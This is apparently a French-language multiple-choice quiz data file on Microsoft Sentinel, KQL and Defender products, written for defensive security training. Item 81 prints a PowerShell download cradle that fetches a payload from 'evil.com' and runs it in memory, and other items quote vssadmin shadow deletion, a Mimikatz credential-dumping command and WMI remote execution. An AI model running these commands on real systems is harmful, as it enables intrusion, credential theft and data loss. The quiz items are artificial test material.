{id:62,category:"Microsoft Sentinel",question:"Comment détecter le 'Pass-the-Hash' (PtH) dans Sentinel via SecurityEvent ?",options:["EventID 4624 uniquement","EventID 4624 avec LogonType=3 (réseau) et AuthenticationPackageName='NTLM' ET SubjectLogonId != '0x0' depuis des comptes sensibles","EventID 4625 toujours","EventID 4688 uniquement"],answer:1,explanation:"Pass-the-Hash se caractérise par des connexions réseau (LogonType=3) NTLM sans saisie de mot de passe interactif. Le combo LogonType=3 + NTLM + depuis des comptes à privilèges est suspect, surtout si SubjectLogonId diffère du pattern habituel."},
{id:63,category:"Microsoft Sentinel",question:"Scénario: Vous avez besoin d'ingérer des logs depuis un SIEM tiers (Splunk) vers Sentinel pour la corrélation centralisée. Quelle approche ?",options:["Impossible","Via l'API HTTP Data Collector de Log Analytics, un agent forwarder, ou un connecteur partner spécifique selon la source","Via Azure Data Factory uniquement","Via un tunnel SSH"],answer:1,explanation:"Plusieurs options: l'API HTTP Data Collector permet d'envoyer des JSON via REST, un Logstash agent avec plugin Azure Monitor, ou des connecteurs partenaires (ex: Splunk Add-on for Microsoft Cloud Services)."},
{id:64,category:"Microsoft Sentinel",question:"Qu'est-ce que la fonction 'iff()' dans KQL ?",options:["Une fonction de hashage","Une expression conditionnelle ternaire: iff(condition, valeur_si_vrai, valeur_si_faux)","Une fonction pour tester si un champ existe","Une fonction d'indexation"],answer:1,explanation:"iff() dans KQL est l'équivalent de l'opérateur ternaire: iff(x > 10, 'High', 'Low') retourne 'High' si x > 10, sinon 'Low'. Utile dans 'extend' pour créer des colonnes calculées conditionnelles."},
{id:65,category:"Microsoft Sentinel",question:"Quelle est la table Sentinel qui contient les activités des applications Microsoft 365 Defender ?",options:["M365DefenderAlerts","AlertInfo (schéma Advanced Hunting)","SecurityAlert avec ProductName","Les deux B et C selon la configuration"],answer:3,explanation:"Selon la configuration, les activités Defender M365 peuvent être dans SecurityAlert (pour les alertes classiques via connecteur) ou dans les tables Advanced Hunting (AlertInfo, AlertEvidence) si le connecteur M365 Defender est configuré."},
{id:66,category:"KQL Avancé",question:"Quelle est la différence entre 'has' et 'contains' dans KQL ?",options:["Ils sont identiques","'has' cherche un terme entier (tokenized, plus rapide); 'contains' cherche une sous-chaîne (plus lent, plus flexible)","'has' est insensible à la casse, 'contains' est sensible","'contains' est obsolète"],answer:1,explanation:"'has' dans KQL recherche un terme entier dans une colonne indexée (tokenized), beaucoup plus performant. 'contains' cherche n'importe quelle sous-chaîne. Utiliser 'has' quand possible pour les performances."},
{id:67,category:"KQL Avancé",question:"Comment créer une requête KQL qui cherche des patterns dans des logs en utilisant des expressions régulières ?",options:["Utiliser 'like' comme en SQL","Utiliser l'opérateur 'matches regex' ou la fonction 'extract(regex, group, source)'","Utiliser 'wildcard'","Les regex ne sont pas supportées dans KQL"],answer:1,explanation:"KQL supporte les regex via 'matches regex' (filtre booléen) et extract() (capture de groupes). Exemple: where CommandLine matches regex @'(?i)powershell.*-enc' pour détecter PowerShell encodé."},
{id:68,category:"KQL Avancé",question:"Qu'est-ce que 'bin()' dans KQL et comment est-il utilisé ?",options:["Encode des données en binaire","Arrondit les valeurs numériques ou les timestamps à un intervalle (bucket) pour créer des fenêtres temporelles","Stocke des données temporaires","Convertit des types de données"],answer:1,explanation:"bin() dans KQL arrondit les valeurs à un multiple de l'intervalle spécifié. bin(TimeGenerated, 1h) groupe les événements par heure, permettant des agrégations temporelles (graphiques timechart)."},
{id:69,category:"KQL Avancé",question:"Comment utiliser 'union' pour interroger plusieurs tables dans KQL ?",options:["union ne peut joindre que 2 tables","union table1, table2, table3 combine les lignes de plusieurs tables avec le même schéma (ou compatible)","union fait une jointure basée sur des clés","union est uniquement pour les tables externes"],answer:1,explanation:"L'opérateur union dans KQL combine verticalement les lignes de plusieurs tables: union SecurityEvent, Syslog, WindowsEvent retourne les lignes de toutes les tables avec les colonnes communes, ajoutant $table pour identifier la source."},
{id:70,category:"KQL Avancé",question:"Qu'est-ce que la clause 'where' avec 'in~' dans KQL ?",options:["Un filtre insensible à la casse pour une liste de valeurs","Un filtre qui inverse la sélection","Une jointure interne","Un filtre sur les valeurs nulles"],answer:0,explanation:"'in~' dans KQL est la version case-insensitive de 'in'. 'where UserName in~ ('Admin', 'admin', 'ADMIN')' correspond aux trois variantes. Le tilde (~) indique une comparaison insensible à la casse."},
{id:71,category:"KQL Avancé",question:"Comment optimiser une requête KQL lente dans Sentinel ?",options:["Augmenter le compute du workspace","Filtrer d'abord par TimeGenerated, utiliser 'has' plutôt que 'contains', éviter les wildcards en début de recherche, utiliser 'project' tôt pour réduire les colonnes","Exécuter la requête moins souvent","Utiliser des vues matérialisées uniquement"],answer:1,explanation:"Optimisations KQL: 1) Filtrer TimeGenerated en premier (utilise l'index), 2) has > contains > startswith > substring, 3) Réduire les colonnes avec project tôt, 4) Éviter les fonctions scalaires coûteuses sur de grandes tables."},
{id:72,category:"KQL Avancé",question:"Qu'est-ce que 'datatable' dans KQL ?",options:["Une fonction pour créer des tableaux de bord","Permet de définir une table inline dans une requête (données statiques)","Un type de table externe","Une fonction d'import CSV"],answer:1,explanation:"datatable() dans KQL crée une table de données inline directement dans la requête. Utile pour définir des listes de référence, des seuils ou des données de test sans watchlist externe."},
{id:73,category:"KQL Avancé",question:"Comment calculer le percentile 95 du temps de réponse d'une API dans KQL ?",options:["avg(ResponseTime)","percentile(ResponseTime, 95)","max(ResponseTime)","stddev(ResponseTime)"],answer:1,explanation:"La fonction percentile() dans KQL calcule le Nème percentile d'une colonne numérique dans un groupe summarize. percentile(ResponseTime, 95) donne le temps de réponse en dessous duquel se trouvent 95% des requêtes."},
{id:74,category:"KQL Avancé",question:"Qu'est-ce que l'opérateur 'parse' dans KQL ?",options:["Lit des fichiers JSON externes","Extrait des champs structurés depuis une chaîne non structurée en utilisant un pattern textuel","Convertit des types de données","Joint des tables"],answer:1,explanation:"L'opérateur 'parse' dans KQL utilise des patterns simples (avec des wildcards *) pour extraire des champs depuis des chaînes non structurées. Exemple: parse CommandLine with 'powershell' params '-File ' filename ' ' *."},
{id:75,category:"KQL Avancé",question:"Comment créer une requête KQL qui détecte si un utilisateur fait partie d'un groupe Active Directory (data dans AuditLogs) ?",options:["AuditLogs | where GroupName contains 'Admins'","AuditLogs | where OperationName == 'Add member to group' | extend User=tostring(TargetResources[0].userPrincipalName), Group=tostring(TargetResources[1].displayName)","SecurityEvent | where EventID==4728","Les deux B et C sont pertinents"],answer:3,explanation:"AuditLogs AAD contient 'Add member to group' avec les détails dans TargetResources (tableau JSON). SecurityEvent 4728 (membre ajouté à un groupe global de sécurité) est l'équivalent Windows. Les deux tables sont utiles selon l'environnement."},
{id:76,category:"KQL Avancé",question:"Qu'est-ce que 'mv-apply' dans KQL et en quoi diffère-t-il de 'mv-expand' ?",options:["Ils sont identiques","mv-expand développe un array en lignes séparées; mv-apply applique une sous-requête sur chaque élément d'un array sans nécessairement développer les lignes","mv-apply est plus récent et remplace mv-expand","mv-apply s'applique uniquement aux property bags"],answer:1,explanation:"mv-expand crée une ligne par élément d'un array. mv-apply applique une transformation/filtrage sur les éléments d'un array et peut retourner une ligne par groupe avec des arrays modifiés, plus flexible pour les opérations sur arrays."},
{id:77,category:"KQL Avancé",question:"Comment utiliser les variables 'let' avec des fonctions dans KQL ?",options:["let ne supporte que les valeurs scalaires","let peut définir des fonctions réutilisables avec paramètres: let myFunc = (param:string) { query }; myFunc('value')","let est uniquement pour les sous-requêtes tabulaires","let n'est pas supporté dans les règles analytiques"],answer:1,explanation:"let dans KQL peut définir: des scalaires (let x=10), des tables (let t=TableName | filter), et des fonctions avec paramètres (let f=(p:string){table | where Field==p}). Ces fonctions sont réutilisables dans la même requête."},
{id:78,category:"KQL Avancé",question:"Quelle fonction KQL convertit un timestamp en chaîne formatée ?",options:["toString()","format_datetime()","tostring() avec format","datetime_format()"],answer:1,explanation:"format_datetime() dans KQL convertit un datetime en chaîne avec un format spécifié: format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss'). Utile pour l'affichage et les rapports."},
{id:79,category:"KQL Avancé",question:"Comment détecter les changements de fréquence anormale (spike detection) dans KQL sans ML ?",options:["C'est impossible sans ML","Calculer la moyenne et l'écart-type sur une fenêtre historique, puis alerter si la valeur actuelle dépasse moyenne + N*stddev","Utiliser threshold fixe uniquement","Via des règles Anomaly uniquement"],answer:1,explanation:"Le spike detection statistique dans KQL: calculer avg+2*stddev sur les dernières 7 jours (baseline), puis comparer la valeur actuelle. Si elle dépasse le seuil dynamique, c'est une anomalie. Exemple utilisé pour détecter des pics de trafic anormaux."},
{id:80,category:"KQL Avancé",question:"Qu'est-ce que 'external_data()' dans KQL ?",options:["Accède à des données Azure External Tables","Charge des données depuis un fichier externe (Blob Storage, HTTPS) directement dans une requête KQL","Accède aux données d'un autre workspace","Importe des données depuis des APIs externes"],answer:1,explanation:"external_data() dans KQL permet de charger et interroger des données depuis Azure Blob Storage ou des URLs HTTPS directement dans une requête, sans importer les données dans Log Analytics. Utile pour des listes de référence volumineuses."},
{id:81,category:"Defender for Endpoint",question:"Scénario: Une alerte MDE indique 'Suspicious PowerShell download cradle'. Qu'est-ce que cela signifie ?",options:["PowerShell télécharge des mises à jour légitimes","Une commande PowerShell utilise IEX/Invoke-Expression ou DownloadString pour télécharger et exécuter du code depuis Internet sans le sauvegarder sur disque (fileless attack)","PowerShell est mal configuré","PowerShell a besoin d'une mise à jour"],answer:1,explanation:"Un download cradle PowerShell est une technique d'attaque fileless: (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX exécute du code malveillant directement en mémoire sans créer de fichier sur disque."},
{id:82,category:"Defender for Endpoint",question:"Quelle est la différence entre 'Quarantine' et 'Isolation' dans MDE pour un endpoint ?",options:["Ils sont identiques","Quarantine supprime/isole un fichier malveillant spécifique; Isolation coupe l'endpoint du réseau tout entier","Quarantine désactive le compte utilisateur","Isolation supprime les processus malveillants"],answer:1,explanation:"Quarantine dans MDE met un fichier malveillant en quarantaine (le supprime et le stocke dans un espace protégé). Isolation coupe l'endpoint de tout le réseau (sauf communications MDE) pour contenir une compromission."},
{id:83,category:"Defender for Endpoint",question:"Quelle est la table Advanced Hunting qui contient les modifications de fichiers sur les endpoints ?",options:["DeviceFileCreated","DeviceFileEvents","FileModificationLogs","EndpointFileActivity"],answer:1,explanation:"La table DeviceFileEvents dans Advanced Hunting/MDE contient tous les événements fichiers (création, modification, suppression, renommage) sur les endpoints supervisés par MDE."},
{id:84,category:"Defender for Endpoint",question:"Scénario: Un attaquant utilise 'certutil.exe' pour télécharger un payload malveillant. Comment détecter ça avec MDE ?",options:["Impossible de détecter certutil","DeviceProcessEvents | where FileName =~ 'certutil.exe' and ProcessCommandLine has_any ('-urlcache', '-split', 'http')","SecurityEvent | where certutil","AuditLogs | certutil"],answer:1,explanation:"certutil.exe est un outil Windows légitime souvent abusé pour télécharger des fichiers via -urlcache -split. DeviceProcessEvents filtre les processus certutil avec des arguments suspects de téléchargement."},
{id:85,category:"Defender for Endpoint",question:"Qu'est-ce que le 'AMSI (Antimalware Scan Interface)' dans le contexte MDE ?",options:["Un outil de scan manuel","Une interface Windows qui permet aux solutions antimalware de scanner le contenu en mémoire (scripts PowerShell, VBScript, Macros) avant exécution","Un protocole réseau de sécurité","Un service de mise à jour des signatures"],answer:1,explanation:"AMSI est une interface API Windows qui permet aux antimalware (dont Defender) de scanner le contenu des scripts (PowerShell, JavaScript, VBScript, macros Office) juste avant leur exécution, détectant les attaques fileless et obfusquées."},
{id:86,category:"Defender for Endpoint",question:"Quelle règle ASR (Attack Surface Reduction) bloque spécifiquement les macros Office ?",options:["Block JavaScript","Block Office applications from creating child processes","Block all Office macros","Block Office communication application from creating child processes"],answer:1,explanation:"La règle ASR 'Block Office applications from creating child processes' empêche les applications Office (Word, Excel, PowerPoint) de créer des processus enfants, bloquant l'exécution de code malveillant via des macros."},
{id:87,category:"Defender for Endpoint",question:"Scénario: Vous devez déployer MDE sur 500 serveurs Linux. Quelle est la méthode recommandée ?",options:["Installation manuelle sur chaque serveur","Via un outil de gestion de configuration (Ansible, Puppet, Chef) ou Microsoft Intune/MECM pour déploiement à grande échelle","Via PowerShell Remoting uniquement","Via Azure Update Management"],answer:1,explanation:"Pour un déploiement à grande échelle de MDE Linux, les outils de gestion de configuration (Ansible, Puppet) ou Microsoft Endpoint Configuration Manager (MECM)/Intune sont recommandés pour automatiser et standardiser le déploiement et la configuration."},
{id:88,category:"Defender for Endpoint",question:"Qu'est-ce que 'EDR in block mode' dans MDE ?",options:["MDE qui bloque tous les fichiers inconnus","EDR en mode passif qui peut quand même bloquer les artefacts malveillants détectés par MDE même quand un autre antivirus est le produit principal","MDE configuré en mode audit uniquement","L'isolation automatique des endpoints"],answer:1,explanation:"'EDR in block mode' permet à MDE d'agir sur les détections EDR même quand il n'est pas l'antivirus principal (un autre AV tiers gère la protection temps réel). MDE peut quand même bloquer les artefacts post-compromission détectés."},
{id:89,category:"Defender for Endpoint",question:"Quelle table Advanced Hunting contient les événements de connexions réseau sortantes des endpoints ?",options:["DeviceNetworkInfo","DeviceNetworkEvents","NetworkConnections","EndpointNetworkActivity"],answer:1,explanation:"DeviceNetworkEvents contient toutes les connexions réseau (initiées et reçues) sur les endpoints MDE, avec les IPs locales/distantes, ports, processus initiateur, et état de la connexion."},
{id:90,category:"Defender for Endpoint",question:"Scénario: Une alerte MDE indique un mouvement latéral via WMI (Windows Management Instrumentation). Quelle est la gravité et que faire ?",options:["Ignorer, WMI est normal","Sévérité haute - WMI est souvent utilisé pour l'exécution à distance et la persistance. Investiguer le processus parent, les connexions réseau WMI et les comptes utilisés","Redémarrer le service WMI","Désactiver WMI globalement"],answer:1,explanation:"WMI est fréquemment utilisé par les APTs pour l'exécution à distance (wmic /node:target process call create), la persistance (WMI event subscriptions) et le pivoting. Une alerte WMI latéral doit être traitée avec haute priorité."},
{id:91,category:"Defender for Endpoint",question:"Qu'est-ce que 'Automated Investigation and Response (AIR)' dans MDE ?",options:["Un rapport d'investigation automatisé","Un système qui déclenche automatiquement des investigations sur les alertes, collecte des preuves, détermine la cause racine et recommande/exécute des actions de remédiation","Un outil de forensics manuel","Un service de threat hunting automatique"],answer:1,explanation:"AIR dans MDE déclenche automatiquement une investigation complète (collecte d'artefacts, analyse de la cause racine, corrélation) lors d'alertes et recommande ou exécute automatiquement des remédiations (quarantine de fichiers, isolation)."},
{id:92,category:"Defender for Endpoint",question:"Comment MDE gère-t-il les 'Indicators of Compromise (IoC)' personnalisés ?",options:["MDE ne supporte pas les IoC personnalisés","Via la section Indicators dans le portail MDE où on peut ajouter des hashes, IPs, URLs et domaines à bloquer ou à autoriser","Via des règles ASR uniquement","Via Azure Sentinel uniquement"],answer:1,explanation:"MDE permet l'ajout d'IoC personnalisés (file hashes SHA1/SHA256, IP addresses, URLs, domain names) avec des actions (allow, block, audit) via le portail MDE ou l'API, appliqués à tous les endpoints supervisés."},
{id:93,category:"Defender for Endpoint",question:"Scénario: Vous observez wscript.exe spawn cmd.exe avec des arguments encodés. Quelle technique MITRE ATT&CK cela représente-t-il ?",options:["T1204 User Execution","T1059 Command and Scripting Interpreter (Windows Script Host spawning cmd)","T1110 Brute Force","T1566 Phishing"],answer:1,explanation:"wscript.exe (Windows Script Host) spawning cmd.exe est T1059 - Command and Scripting Interpreter. C'est une technique courante où un script VBS/JS malveillant (souvent livré via phishing) lance cmd.exe pour exécuter des commandes."},
{id:94,category:"Defender for Endpoint",question:"Qu'est-ce que le 'Deception' dans MDE (Microsoft Defender Deception) ?",options:["Un module de sandbox pour les fichiers suspects","Une technologie qui déploie des leurres (honeytokens, fake credentials, faux fichiers) sur les endpoints pour détecter et piéger les attaquants en mouvement latéral","Un outil de phishing simulation","Une fonctionnalité de déchiffrement SSL"],answer:1,explanation:"Microsoft Defender Deception déploie automatiquement des leurres sur les endpoints (faux comptes, faux fichiers de configuration, faux endpoints réseau) pour détecter les attaquants qui tentent de se déplacer latéralement."},
{id:95,category:"Defender for Endpoint",question:"Quelle requête Advanced Hunting détecte les modifications du fichier HOSTS Windows ?",options:["RegistryEvents | where HOSTS","DeviceFileEvents | where FileName =~ 'hosts' and FolderPath has @'\\drivers\\etc'","SecurityEvent | where HOSTS","FileModification | where hosts"],answer:1,explanation:"Le fichier HOSTS (C:\\Windows\\System32\\drivers\\etc\\hosts) est souvent modifié par des malwares pour rediriger du trafic. DeviceFileEvents filtré sur le nom et le chemin détecte ces modifications."},
{id:96,category:"Defender for Endpoint",question:"Qu'est-ce que 'Microsoft Defender Vulnerability Management' (MDVM) et comment priorise-t-il les vulnérabilités ?",options:["Un outil de scan de ports réseau","Une solution intégrée dans MDE qui découvre et priorise les vulnérabilités en combinant CVSS, exploitabilité réelle, présence d'exploits actifs et criticité des actifs","Un outil de gestion des patchs Windows uniquement","Un scanner de configuration Azure"],answer:1,explanation:"MDVM priorise les vulnérabilités avec le score CVSS mais surtout avec le 'Exposure Score' qui tient compte de: l'exploitabilité réelle (exploit kit disponible?), les menaces actives (CVE exploitée dans la nature?), et l'importance métier de l'actif."},
{id:97,category:"Defender for Endpoint",question:"Scénario: MDE détecte 'Potential credential theft from lsass.exe'. Qu'est-ce que cela signifie ?",options:["lsass.exe a un problème de performance","Un processus tente d'accéder à la mémoire de lsass.exe pour extraire des credentials (technique Mimikatz, Credential Dumping - T1003)","lsass.exe a besoin d'une mise à jour","Un utilisateur a changé son mot de passe"],answer:1,explanation:"lsass.exe (Local Security Authority Subsystem) stocke les credentials en mémoire. Des outils comme Mimikatz (sekurlsa::logonpasswords) tentent d'accéder à sa mémoire. MDE détecte via ETW (Event Tracing for Windows) ces accès suspects."},
{id:98,category:"Defender for Endpoint",question:"Qu'est-ce que 'Microsoft Defender Antivirus (MDAV)' en mode passif vs actif ?",options:["Mode passif = désactivé","Mode actif = MDAV est l'AV principal (scan temps réel, remédiation). Mode passif = MDAV analyse mais ne remédie pas (quand un autre AV est le principal)","Mode passif = scan planifié uniquement","Il n'y a pas de mode passif"],answer:1,explanation:"MDAV en mode actif est l'antivirus principal: protection temps réel, remédiation active. En mode passif (quand un autre AV est installé), MDAV scanne et détecte mais ne bloque pas activement, permettant à EDR/AIR de fonctionner."},
{id:99,category:"Defender for Endpoint",question:"Quelle fonctionnalité MDE permet d'analyser un fichier suspect sans l'exécuter sur votre environnement ?",options:["Live Response","Sandbox/Deep Analysis - soumet le fichier à un sandbox cloud pour analyse comportementale","Quarantine Analysis","File Hash Lookup"],answer:1,explanation:"La fonctionnalité 'Deep Analysis' dans MDE soumet un fichier (PE, Office, PDF, etc.) à un sandbox cloud pour analyse comportementale complète (comportement réseau, registre, processus créés) sans risquer l'exécution dans l'environnement de production."},
{id:100,category:"Defender for Endpoint",question:"Comment MDE détecte-t-il les ransomwares avant que la majorité des fichiers ne soient chiffrés ?",options:["Uniquement via signatures antivirus","Via la détection comportementale: patterns d'accès fichiers massifs anormaux (shadow copy deletion, renommage d'extensions en masse, chiffrement rapide), arrêt tôt grâce à l'analyse comportementale temps réel","Via scan planifié uniquement","Impossible avant chiffrement complet"],answer:1,explanation:"MDE détecte les ransomwares comportementalement: suppression des VSS (vssadmin delete shadows), renommage massif de fichiers en extensions inconnues, accès séquentiel à de nombreux fichiers, injection dans explorer.exe. La détection précoce permet de stopper avant chiffrement complet."},
{id:101,category:"Defender for Endpoint",question:"Qu'est-ce que le 'Microsoft Defender for Business' comparé à 'Microsoft Defender for Endpoint Plan 2' ?",options:["Ils sont identiques","Defender for Business est simplifié et optimisé pour les PME (<300 employés); MDE Plan 2 est enterprise avec TVM avancé, Threat Experts, APIs, SIEM intégration","Defender for Business est plus cher","MDE Plan 2 est pour les serveurs uniquement"],answer:1,explanation:"Defender for Business est une version simplifiée pour les PME avec une interface streamlinée, politique de sécurité simplifiée et moins de fonctionnalités avancées. MDE Plan 2 est la version enterprise complète avec toutes les fonctionnalités."},
{id:102,category:"Defender for Endpoint",question:"Scénario: Un utilisateur clique sur un lien de phishing, son navigateur télécharge un payload. Comment MDE répond-il automatiquement ?",options:["MDE n'a pas de réponse automatique pour le navigateur","Network Protection (si activé) bloque l'accès au domaine malveillant; SmartScreen bloque le téléchargement; si le fichier passe, MDAV le détecte; AIR peut isoler la machine","Uniquement alerte manuelle","Uniquement blocage réseau"],answer:1,explanation:"La chaîne de protection MDE pour le phishing: 1) Network Protection bloque le domaine malveillant connu, 2) SmartScreen bloque le téléchargement de fichiers suspects, 3) MDAV analyse le fichier téléchargé, 4) AIR enquête et peut isoler si compromis."},
{id:103,category:"Defender for Endpoint",question:"Quel EventID Windows correspond à la création d'une tâche planifiée suspecte (souvent utilisée pour la persistance) ?",options:["4624","4698 (A scheduled task was created)","4688","4776"],answer:1,explanation:"EventID 4698 journalise la création de tâches planifiées Windows (outil de persistance commun des malwares via schtasks.exe ou l'API Task Scheduler). A surveiller particulièrement pour les tâches créées par des processus non-admin."},
{id:104,category:"Defender for Endpoint",question:"Qu'est-ce que 'Controlled Folder Access' dans MDE ?",options:["Un système de contrôle d'accès RBAC","Une fonctionnalité qui protège des dossiers spécifiques contre les modifications non autorisées (anti-ransomware), bloquant les processus non approuvés","Un outil de classification de fichiers","Un système de backup automatique"],answer:1,explanation:"Controlled Folder Access dans MDE protège les dossiers désignés (Documents, Images, Desktop, etc.) en bloquant tout processus non approuvé qui tente de modifier les fichiers. C'est une protection anti-ransomware efficace."},
{id:105,category:"Defender for Endpoint",question:"Quelle est la différence entre 'Threat & Vulnerability Management' dans MDE et un scanner de vulnérabilités traditionnel ?",options:["Ils sont identiques","TVM est agentless et utilise les données déjà collectées par l'agent MDE (pas de scan réseau actif), offrant une vue continue et en temps réel sans fenêtres de maintenance","TVM est moins précis","TVM scanne uniquement les ports ouverts"],answer:1,explanation:"TVM utilise les informations déjà collectées par l'agent MDE sur les endpoints (logiciels installés, configurations, patches) sans scan réseau actif. Résultat: aucun impact réseau, données temps réel, pas de fenêtres de scan à planifier."},
{id:106,category:"Defender for Cloud",question:"Scénario: Votre score de sécurité Defender for Cloud est de 45%. Par où commencer les améliorations ?",options:["Commencer par les recommandations les moins importantes","Trier les recommandations par 'Potential Score Increase' pour prioriser celles qui augmentent le plus le score, en tenant compte de la faisabilité","Travailler alphabétiquement","Ignorer les recommandations sous 50% d'impact"],answer:1,explanation:"Pour maximiser l'amélioration du Secure Score, trier les recommandations par 'Potential Score Increase' et traiter d'abord celles qui augmentent le plus le score. Considérer aussi la criticité des ressources affectées."},
{id:107,category:"Defender for Cloud",question:"Qu'est-ce que 'Defender CSPM' (Cloud Security Posture Management Premium) dans Defender for Cloud ?",options:["Une fonctionnalité identique au CSPM de base","Un plan premium qui ajoute: attack path analysis, cloud security explorer, data-aware security posture, gouvernance et conformité réglementaire avancée","Un plan pour les conteneurs uniquement","Un scanner de vulnérabilités réseau"],answer:1,explanation:"Defender CSPM Premium ajoute: Attack Path Analysis (visualiser les chemins d'attaque potentiels), Cloud Security Explorer (requêtes de posture cross-cloud), Data-aware Security (données sensibles exposées), et des fonctionnalités de gouvernance avancées."},
{id:108,category:"Defender for Cloud",question:"Quelle est la différence entre 'Security Policy' et 'Regulatory Compliance' dans Defender for Cloud ?",options:["Ils sont identiques","Security Policy est basée sur l'Azure Security Benchmark (contrôles techniques recommandés); Regulatory Compliance évalue la conformité à des standards réglementaires spécifiques (ISO 27001, PCI DSS, HIPAA)","Security Policy est payante, Regulatory Compliance est gratuite","Security Policy s'applique aux VMs, Regulatory Compliance aux données"],answer:1,explanation:"La Security Policy dans MDC applique l'Azure Security Benchmark (recommandations de sécurité techniques). Regulatory Compliance évalue la conformité à des frameworks réglementaires spécifiques importés dans MDC (ISO, PCI, HIPAA, NIST)."},
{id:109,category:"Defender for Cloud",question:"Scénario: Une VM Azure expose le port 3389 (RDP) directement sur Internet. Quelle recommandation Defender for Cloud génèrera-t-il ?",options:["Aucune recommandation, c'est normal","'Management ports of virtual machines should be protected with just-in-time network access control' avec sévérité High","Uniquement une alerte email","Blocage automatique du port"],answer:1,explanation:"MDC détecte les ports de gestion (RDP 3389, SSH 22) exposés sur Internet et génère une recommandation High pour activer JIT (Just-In-Time) VM Access, qui fermera le port et le rouvrira temporairement sur demande."},
{id:110,category:"Defender for Cloud",question:"Qu'est-ce que l'intégration Defender for Cloud avec GitHub Advanced Security ?",options:["MDC peut scanner les repositories GitHub","Defender for DevOps intégré dans MDC permet d'évaluer la sécurité des pipelines CI/CD, des configurations IaC (Infrastructure as Code) et du code source","MDC déploie des agents sur les runners GitHub","MDC gère les accès GitHub"],answer:1,explanation:"Defender for DevOps dans MDC s'intègre avec GitHub, Azure DevOps et GitLab pour scanner: les configurations IaC (Terraform, ARM, Bicep) pour des misconfiguration, les secrets exposés dans le code, et les vulnérabilités des dépendances."},
{id:111,category:"Defender for Cloud",question:"Qu'est-ce que l'Attack Path Analysis dans Defender CSPM ?",options:["Un graphique des attaques passées","Une visualisation des chemins qu'un attaquant pourrait emprunter pour atteindre des actifs critiques, basée sur les interconnexions et vulnérabilités de l'environnement","Un outil de simulation d'attaque","Un journal des tentatives d'attaque"],answer:1,explanation:"Attack Path Analysis dans Defender CSPM analyse les connexions entre les ressources cloud, les vulnérabilités et les permissions pour identifier les chemins d'attaque potentiels qu'un attaquant pourrait exploiter pour atteindre des actifs critiques (VMs, bases de données, etc.)."},
{id:112,category:"Defender for Cloud",question:"Quelle alerte Defender for Cloud indique qu'une VM Azure est potentiellement utilisée pour le crypto-mining ?",options:["Suspicious process executed","Digital currency mining activity - anomalous resource consumption patterns detected","VM performance degradation","Unauthorized software installation"],answer:1,explanation:"Defender for Cloud génère l'alerte 'Digital currency mining activity' quand des patterns de consommation CPU/réseau anormaux correspondant au crypto-mining sont détectés sur une VM, souvent suite à une compromission."},
{id:113,category:"Defender for Cloud",question:"Comment Defender for Cloud gère-t-il la sécurité des bases de données Azure SQL ?",options:["Via un scan de ports uniquement","Microsoft Defender for SQL détecte les injections SQL, accès anormaux, brute force sur les serveurs SQL, et évalue les configurations de sécurité des databases","Via des règles de pare-feu uniquement","Via des audits manuels planifiés"],answer:1,explanation:"Microsoft Defender for SQL (plan Defender for Cloud) monitore les activités SQL en temps réel, détecte les anomalies (injection SQL, accès depuis Tor, volumétrie anormale), et évalue les configurations de sécurité des instances SQL Azure."},
{id:114,category:"Defender for Cloud",question:"Scénario: Vous gérez une infrastructure multi-cloud (Azure + AWS + GCP). Comment Defender for Cloud peut-il aider ?",options:["MDC est uniquement Azure","Via les connecteurs cloud (AWS Connector, GCP Connector), MDC peut ingérer les recommendations de sécurité et alertes des autres clouds pour une vue unifiée de la posture de sécurité multi-cloud","Via Azure Arc uniquement","Via des agents installés manuellement"],answer:1,explanation:"Defender for Cloud supporte le multi-cloud via des connecteurs natifs pour AWS et GCP (et Azure Arc pour on-premises). Cela centralise la posture de sécurité, les alertes et la conformité de tous les environnements dans un seul dashboard."},
{id:115,category:"Defender for Cloud",question:"Qu'est-ce que la 'Governance Rule' dans Defender for Cloud ?",options:["Une règle Azure Policy","Une règle qui assigne des responsabilités de remédiation aux propriétaires de ressources avec des délais définis pour améliorer la gouvernance de la sécurité","Un contrôle d'accès RBAC","Une règle de compliance automatique"],answer:1,explanation:"Les Governance Rules dans MDC assignent automatiquement les recommandations de sécurité à des propriétaires de ressources spécifiques avec des délais de remédiation définis, créant une responsabilisation pour l'amélioration de la posture."},
{id:116,category:"Defender for Cloud",question:"Comment Defender for Containers protège-t-il les images de conteneurs dans Azure Container Registry ?",options:["Scan manuel des images à la demande uniquement","Scan automatique des images lors du push et des images en cours d'exécution, avec détection des CVE, malwares et misconfigurations, et génération de recommandations de correction","Blocage de tous les images non-signées","Scan des images hebdomadaire uniquement"],answer:1,explanation:"Defender for Containers scanne automatiquement les images dans ACR lors du push ET pendant l'exécution dans AKS. Il détecte les CVE connues, les malwares, et les mauvaises configurations, avec des recommandations de correction priorisées."},
{id:117,category:"Defender for Cloud",question:"Qu'est-ce que 'Adaptive Application Controls' dans Defender for Cloud ?",options:["Des politiques de déploiement d'applications","Une fonctionnalité ML qui apprend les applications légitimes d'un groupe de VMs et génère des recommandations de liste blanche (application allowlisting)","Un gestionnaire de licences applicatives","Des règles de pare-feu applicatif"],answer:1,explanation:"Adaptive Application Controls dans MDC utilise ML pour analyser les applications en cours d'exécution sur un groupe de VMs sur 2 semaines, puis recommande des règles AppLocker/Windows Defender Application Control pour créer une allowlist intelligente."},
{id:118,category:"Defender for Cloud",question:"Scénario: Un Storage Account Azure est accessible publiquement. Quelle alerte/recommandation Defender for Cloud génère-t-il ?",options:["Aucune, c'est une configuration normale","Recommandation 'Storage accounts should restrict network access' et potentiellement alerte si des activités suspectes sont détectées (accès depuis Tor, credential scanning)","Blocage automatique de l'accès public","Recommandation de conformité uniquement"],answer:1,explanation:"MDC génère une recommandation pour restreindre l'accès réseau des Storage Accounts. Si Defender for Storage est activé, il génère également des alertes si des accès suspects sont détectés sur ce storage account exposé."},
{id:119,category:"Defender for Cloud",question:"Quelle est la différence entre 'Secure Score Controls' et 'Secure Score Recommendations' dans MDC ?",options:["Ce sont les mêmes choses","Un Control est un groupe logique de Recommendations liées (ex: 'Enable MFA' est un contrôle contenant plusieurs recommandations). Satisfaire toutes les reco d'un contrôle donne les points du contrôle","Un Control est plus important qu'une Recommendation","Les Controls sont payants, les Recommendations gratuites"],answer:1,explanation:"Les Security Controls dans MDC regroupent des recommandations liées par thème (ex: 'Remediate vulnerabilities', 'Enable MFA', 'Apply system updates'). Le Secure Score augmente quand toutes les recommandations d'un contrôle sont satisfaites."},
